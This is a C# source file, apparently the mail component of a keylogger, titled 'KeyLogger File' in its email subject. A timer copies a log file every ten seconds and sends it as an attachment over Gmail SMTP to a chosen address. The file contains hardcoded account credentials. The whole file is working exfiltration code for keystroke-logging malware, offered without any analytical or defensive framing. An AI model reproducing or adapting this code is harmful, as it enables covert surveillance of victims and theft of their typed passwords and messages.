using System;
using System.Timers;
using System.Net.Mail;
using System.Net;
using System.Net.Mime;

namespace WpfApplication8
{
    class MailHandler
    {
        string mailTo;
        string filename = "rtx32.txt", targetname = "rtx86.txt";
        private static System.Timers.Timer Timer;

        public void SetTimer(System.Timers.Timer aTimer, string mailbox)
        {
            mailTo = mailbox;
            aTimer = new System.Timers.Timer(10000);
            Timer = aTimer;
            Timer.Elapsed += (sender, e) => SendMail(sender, e, mailTo);
            Timer.AutoReset = true;
            Timer.Enabled = true;
        }

        private void SendMail(Object source, ElapsedEventArgs e, string mailTo)
        {
            Console.Write(mailTo);
            CopyFile copyfile = new CopyFile();
            copyfile.CopyTxtFile(filename, targetname);
            string host = "smtp.gmail.com";
            SmtpClient client = new SmtpClient(host, 587);
            client.Credentials = new NetworkCredential("21edqcds@gmail.com", "P@ssw0rd_");
            client.EnableSsl = true;
            MailAddress from = new MailAddress("21edqcds@gmail.com");
            MailAddress to;
            try
            {
                to = new MailAddress(mailTo);
                MailMessage message = new MailMessage(from, to);
                message.Body = "Zawartość pliku txt w załączniku";
                Attachment data = new Attachment(targetname, MediaTypeNames.Application.Octet);
                ContentDisposition disposition = data.ContentDisposition;
                disposition.CreationDate = System.IO.File.GetCreationTime(targetname);
                disposition.ModificationDate = System.IO.File.GetLastWriteTime(targetname);
                disposition.ReadDate = System.IO.File.GetLastAccessTime(targetname);
                message.Attachments.Add(data);
                message.Subject = "KeyLogger File";
                client.Send(message);
            }
            catch (ArgumentException ex)
            {
                Console.WriteLine("Pusty adres e-mail ");
            }
            client.Dispose();
            //Console.WriteLine(" Message sent ");
            //Console.ReadLine();
        }

        public void MailStop()
        {
            //aTimer.Stop();
            Timer.Enabled = false;
        }
    }
}
